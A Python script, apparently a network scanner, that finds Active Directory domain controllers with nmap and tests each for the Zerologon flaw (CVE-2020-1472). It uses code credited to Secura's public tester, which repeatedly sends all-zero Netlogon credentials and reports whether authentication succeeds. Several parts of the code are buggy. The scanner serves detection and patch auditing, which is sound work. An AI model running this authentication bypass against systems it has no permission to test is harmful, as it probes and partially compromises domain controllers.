#!/usr/bin/python
"""Zerologon vulnerability scanner with nmap netbios names gathering
# Author: Piotr Kaminski
#Linkedin: www.linkedin.com/in/piotr-kaminski-1336b012
# Date: 2020-09-22
1. Script is first scaning for devices with (139 or 445) and 389 ports opened
2. Checking if port 389 is responding with Domain banner
3. using smb-os-discovery nmap script to gather netbios name for devices 
4. using gathered netbios name to check if device is vulnerable by CVE-202-1472 using code from https://github.com/SecuraBV/CVE-2020-1472 
Todo :
implement RDP script for gathering name
clean the code
"""

import getopt
import re
import ipaddress
import csv
#------below part of code  is from https://github.com/SecuraBV/CVE-2020-1472 ------
from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto

import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%

def fail(msg):
    print(msg, file=sys.stderr)
    print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
    sys.exit(2)

def try_zero_authenticate(dc_handle, dc_ip, target_computer):
    # Connect to the DC's Netlogon service.
    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
    rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
    rpc_con.connect()
    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

    # Use an all-zero challenge and credential.
    plaintext = b'\x00' * 8
    ciphertext = b'\x00' * 8

    # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
    flags = 0x212fffff

    # Send challenge and authentication request.
    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
    try:
        server_auth = nrpc.hNetrServerAuthenticate3(rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, target_computer + '\x00', ciphertext, flags)
        # It worked!
        assert server_auth['ErrorCode'] == 0
        return rpc_con

    except nrpc.DCERPCSessionError as ex:
        # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
        if ex.get_error_code() == 0xc0000022:
            return None
        else:
            fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
    except BaseException as ex:
        fail(f'Unexpected error: {ex}.')

def perform_attack(dc_handle, dc_ip, target_computer):
    # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
    print('Performing authentication attempts...')
    rpc_con = None
    for attempt in range(0, MAX_ATTEMPTS):
        rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)
        if rpc_con == None:
            print('=', end='', flush=True)
        else:
            break

    if rpc_con:
        attack_results = "VULNERABLE"
        print('\nSuccess! DC can be fully compromised by a Zerologon attack.')
    else:
        attack_results = "Patched"
        print('\nAttack failed. Target is probably patched.')
        
    print(attack_results)
    return attack_results

def zerologon(dc_name, dc_ip):
    print("zerologn scanning "+str(dc_name)+" "+str(dc_ip))
    zerologon_attack_results = perform_attack('\\\\' + dc_name, dc_ip, dc_name)
    print(zerologon_attack_results)
    return zerologon_attack_results

#----------------end code taken  from https://github.com/SecuraBV/CVE-2020-1472---------------------------

halt = False

try:
    import argparse
    import nmap
except ImportError:
    print('Missing needed module: argparse or nmap')
    halt = True
    if halt:
        sys.exit()

parser = argparse.ArgumentParser()
parser.add_argument('-i', metavar='in-file', required=True, type=argparse.FileType('rt'))
parser.add_argument('-o', metavar='out-file', required=True, type=argparse.FileType('wt'))
parser.add_argument('-u', metavar='Username', action='store', dest='username', help='Username what will be used to discovery and accessing SMB . By defult it is guest username')
parser.add_argument('-p', metavar='Password', action='store', dest='password', help='Password what will be used to discovery and accessing SMB . By defult it is empty')

global args
args = parser.parse_args()

try:
    results = parser.parse_args()
    print('Input file: ' + str(results.i))
    print('Output file: ' + str(results.o))

except IOError as msg:
    parser.error(str(msg))


#port scan
PORT_NM = nmap.PortScanner()
#smb scans
SMB_NM = nmap.PortScanner()
#other scan
OTHER_NM = nmap.PortScanner()

class SMBhost:
    """  class to contain parsered information from SMB script """
    def __init__(self, ip):
        self.ip = ip
        self.OS = ""
        self.computer_name = ""
        self.Domain = ""
        self.workgroup = ""
        self.CPE = ""
        self.Dialects = ""
        self.SMBv1 = ""
    def add_OS(self, OS):
        self.OS = OS
    def add_computer_name(self, computer_name):
        self.computer_name = computer_name
    def add_Domain(self, Domain):
        self.Domain = Domain
    def add_workgroup(self, workgroup):
        self.workgroup = workgroup
    def add_CPE(self, CPE):
        self.CPE = CPE
    def add_Dialects(self, Dialects):
        self.Dialects = Dialects
    def add_SMBv1(self, SMBv1):
        self.SMBv1 = SMBv1

def sites_count(ip):
    """ file with you could keep list of subnets  with names of those sites with will be include in report """
    site_res = ""
    with open('/root/sites_list.csv', newline='', encoding='UTF-8', errors='ignore') as csvfile:
        spamreader = csv.reader(csvfile, delimiter=',', quotechar='|')
        for row in spamreader:
            value = row[1]
            if (row[2] != "Network") and (ipaddress.ip_address(ip) in ipaddress.ip_network(value, False)):
                site_res = row[0]+" "+row[2]
    return site_res

def smb_info_parser(nmap_results, host_ip):
    """function to parse nmap smb-os-discovery script to class """
    output_list = []
    nmap_output = nmap_results['hostscript']
    network_class = SMBhost(host_ip)
    output_list.append(network_class)
    for output in nmap_output:
        if output['id'] == "smb-os-discovery":
            os_re = re.compile('(?<=OS:).*')
            OS = os_re.search(output['output'])
            if OS:
                OS = OS.group().strip()
                network_class.add_OS(OS)
            computer_name_re = re.compile('(?<=Computer name:).*')
            computer_name = computer_name_re.search(output['output'])
            if computer_name:
                computer_name = computer_name.group().strip()
                network_class.add_computer_name(computer_name)
            workgroup_re = re.compile('(?<=workgroup:).*')
            workgroup = workgroup_re.search(output['output'])
            if workgroup:
                workgroup = workgroup.group().strip()
                network_class.add_workgroup(workgroup)
            domain_name_re = re.compile('(?<=Domain name:).*')
            domain_name = domain_name_re.search(output['output'])
            if domain_name:
                domain_name = domain_name.group().strip()
                network_class.add_Domain(domain_name)
            os_cpe_re = re.compile('(?<=OS CPE:).*')
            os_cpe = os_cpe_re.search(output['output'])
            if os_cpe:
                os_cpe = os_cpe.group().strip()
                network_class.add_CPE(os_cpe)
        elif output['id'] == "smb-protocols":
            dialects_re = re.compile('\d\.\d\d')
            dialects = dialects_re.findall(output['output'])
            if dialects:
                dialects = '/'.join(dialects)
                network_class.add_Dialects(dialects)
            if "SMBv1" in output['output']:
                network_class.add_SMBv1("Enabled")

    return output_list

def port_rescaning(host_rescan, port_rescan, counter_rescan_int):
    """ that script will rescan port if port was in filter state """
    port_str_rescan = str(port_rescan)
    PORT_NM.scan(host_rescan, port_str_rescan, "-sS")
    port_str_rescan = str(port_rescan)
    rescaning_scan_finished = PORT_NM.all_hosts()
    rescaning_scan_finished_len = len(rescaning_scan_finished)
    # Check if the server has not been switched off in the middle of scan
    port_status = ""
    if rescaning_scan_finished_len == 0:
        results.o.write(host_rescan+",Scan_error,"+port_str_rescan+" \n")
    else:
        port_status = PORT_NM._scan_result['scan'][host_rescan]['tcp'][port_rescan]['state']
    if port_status == "open":
        counter_rescan_int = counter_rescan_int+1
    port_rescan_list = [r3, counter_rescan_int]
    return port_rescan_list

def smb_scan(host_smb, port_str_smb, cmd):
    """ scaning SMB to gather OS version and computer name"""
    if args.username is None or args.password is None:
        SMB_NM.scan(host_smb, port_str_smb, cmd)

    else:
        SMB_NM.scan(host_smb, port_str_smb, cmd+" --script-args 'smbuser="+args.username+",smbpass="+args.password+"' ")
    smb_scan_finished = SMB_NM._scan_result['scan'][host_smb]
    return smb_scan_finished

def os_guesing(host_os):
    """ if smbv1 is disabled checking computer os version by nmap OS guesing function """
    print("Scanning host for Guesing OS ")
    OTHER_NM.scan(host_os, "21-23,25,53,80,110-111,135,139,143,389,443,445,993,995,1723,3306,3389,5900,8080,49150-49155", "-O")
    test = OTHER_NM._scan_result['scan'][host_os]['osmatch']
    if "name" in str(test):
        os_version_gues = OTHER_NM._scan_result['scan'][host_os]['osmatch'][0]['name']
        os_accuracy = OTHER_NM._scan_result['scan'][host_os]['osmatch'][0]['accuracy']
        print(os_version_gues+" "+os_accuracy)
        os_accuracy = int(os_accuracy)
    else:
        os_version_gues = ""
        os_accuracy = 0
    if os_accuracy <= 94:
        os_version_gues = ""
    test_name = OTHER_NM._scan_result['scan'][host_os]['hostnames']

    if "name" in str(test_name):
        hostname_full = OTHER_NM._scan_result['scan'][host_os]['hostnames'][0]['name']
        hostname = hostname_full.split(".")
    else:
        hostname = [""]
    results_guesing = [os_version_gues, hostname[0]]
    return results_guesing

def ldap_port_scan(host_ldap):
    """ checking if server is DC by checking LDAP info"""
    OTHER_NM.scan(host_ldap, "389", " -sV")
    test_ldap = OTHER_NM._scan_result['scan'][host_ldap]['tcp']
    if "Microsoft Windows Active Directory LDAP" in str(test_ldap):
        domain = OTHER_NM._scan_result['scan'][host_ldap]['tcp'][389]['extrainfo']
    else:
        domain = "Nope"
    return domain

def rdp_port_scam(host_rdp):
    """ if missing name it can be sometime retrive from rdp port"""
    OTHER_NM.scan(host_rdp, "3389", " -A")
    test_rdp = OTHER_NM._scan_result['scan'][host_rdp]['tcp']
    if "rdp-ntlm-info" in str(test_rdp):
        rdp_results = OTHER_NM._scan_result['scan'][host_rdp]['tcp'][3389]['script']['rdp-ntlm-info']
    if "ssl-cert" in str(test_rdp):
        rdp_ssl_results = OTHER_NM._scan_result['scan'][host_rdp]['tcp'][3389]['script']['ssl-cert']
counter = 1
counter_test = 1
counter_rescan = 1
counter_str = ""
check_read = "READ"
HEAD_LINE = "IP,site_name_code,computer_name,OS,Domain,workgroup,CPE,SMB_Dialects_Versions,SMBv1_enabled,Domain LDAP,Site LDAP,Zerologon Vulnerable\n"
results.o.write(HEAD_LINE)

with results.i as f:
    for line in f:
        print("=======================================")
        print(line)
        print("=======================================")

        #Starting scan for 445 and 139 smb ports
        PORT_NM.scan(line, '445,139,389', "-sS")
        for host in PORT_NM.all_hosts():
            testhost = PORT_NM._scan_result['scan'][host]
            r2 = PORT_NM._scan_result['scan'][host]['status']['state']
            r3 = PORT_NM._scan_result['scan'][host]['tcp'][445]['state']
            r4 = PORT_NM._scan_result['scan'][host]['tcp'][139]['state']
            r5 = PORT_NM._scan_result['scan'][host]['tcp'][389]['state']

            # when scanning large subnets, some ack can miss and it is marking open ports us filtered, need to scan againg it per ip is working fine
            if r2 == "up" and (r3 == "filtered" or r4 == "filtered"):
                if not (r3 == "open" or r4 == "open"):
                    port = 445
                    port_str = str(port)
                    rescan_results = port_rescaning(host, port, counter_rescan)
                    counter_rescan_str = str(rescan_results[1])
                    if rescan_results == "open":
                        r3 = "open"

            if r2 == "up" and r5 == "filtered":
                port = 139
                port_str = str(port)
                rescan_results = port_rescaning(host, port, counter_rescan)
                counter_rescan_str = str(rescan_results[1])
                if rescan_results == "open":
                    r5 = "open"
                print(host+" rescanned "+counter_rescan_str)
                counter_rescan_str = str(rescan_results[1])

            if r5 == "open":
                ldap_results = ldap_port_scan(host)
            #if ports are open start smb discovery  script
            print(host+","+r2+","+r3+","+r4+","+r5)
            if r2 == "up" and r5 == "open" and (r3 == "open" or r4 == "open") and ldap_results != "Nope":
                print("---------------------start scan --------------------------------")
                if r3 == "open":
                    port_str = "445"
                else:
                    port_str = "139"
                counter_test = counter_test+1
                test_scan_finished = smb_scan(host, port_str, "--script smb-os-discovery.nse,smb-protocols.nse")
                test_scan_finished_len = len(test_scan_finished)
                print(str(test_scan_finished))
                ldap_test = ldap_port_scan(host)
                # Check if the host has not been  switched off in the middle of scan and if it is domain controler
                if test_scan_finished_len == 0 and ldap_test == "Nope":
                    results.o.write(host+",Scan_error,"+port_str+","+ldap_test+" \n")
                    print(host+","+port_str+",Scan_error")
                else:
                    output_scan_str = str(test_scan_finished)
                    #check if  smb discovery script   was able to got any info, if not reapet again and increase timeout to avoid network bandwitch issues
                    scan_results_test = "hostscript"
                    if scan_results_test in output_scan_str:
                        test_hostscript = len(test_scan_finished['hostscript'])
                    else:
                        test_hostscript = 0

                    if test_hostscript < 2 and "SMBv1" in output_scan_str:
                        for x in range(10, 60, 15):
                            print("Rescaning by SMB script with timeout "+str(x))
                            smb_scan(host, port_str, "--script smb-os-discovery.nse,smb-protocols --script-timeout "+str(x))
                            test_scan_finished = output_scan = SMB_NM._scan_result['scan'][host]
                            output_scan_str = str(output_scan)
                            if scan_results_test in output_scan_str:
                                test_hostscript = len(test_scan_finished['hostscript'])
                                if test_hostscript == 2:
                                    break
                        print("Rescaning host")
                    print(output_scan_str)
                    if scan_results_test in output_scan_str:
                        output_smb_parser = smb_info_parser(test_scan_finished, host)
                        counter_str = str(counter)
                        for lists in output_smb_parser:
                            # if smb scans failed then try guesing os using nmap and name from reverse dns
                            if lists.OS == "":
                                guesing_results = os_guesing(host)
                                lists.OS = "guesing("+guesing_results[0]+")"
                                if lists.computer_name == "":
                                    print(str(guesing_results))
                                    lists.computer_name = guesing_results[1]
                            sites_results = sites_count(lists.ip)
                            if lists.computer_name != "":
                                zerologon_results = zerologon(lists.computer_name, lists.ip)
                            else:
                                zerologon_results = "Lack of computer name to scan"
                            host_list = lists.ip+","+sites_results+","+lists.computer_name+","+lists.OS+","+lists.Domain+","+lists.workgroup+","+lists.CPE+","+lists.Dialects+","+lists.SMBv1+","+str(ldap_results)+","+zerologon_results+"\n"
                            results.o.write(host_list)
                            counter = counter+1
                    else:
                        print(host+",no_smb_info"+port_str)
                        os_guesing_re = os_guesing(host)
                        sites_results = sites_count(host)

                        if os_guesing_re[1] != "":
                            zerologon_results = zerologon(lists.computer_name, lists.ip)
                        else:
                            zerologon_results = "Lack of computer name to scan"
                        results.o.write(host+","+sites_results+","+os_guesing_re[1]+","+os_guesing_re[0]+",no_smb_info,"+str(ldap_results)+zerologon_results+"\n")
                print(counter_str+","+host+","+port_str)
                print("---------------------end scan --------------------------------")
print("Number of host from with one has been received smb info:")
print(counter)
print("Number host with open smb ports:")
print(counter_test)
print("Successfully rescans:")
print(counter_rescan)
results.o.close()
results.i.close()
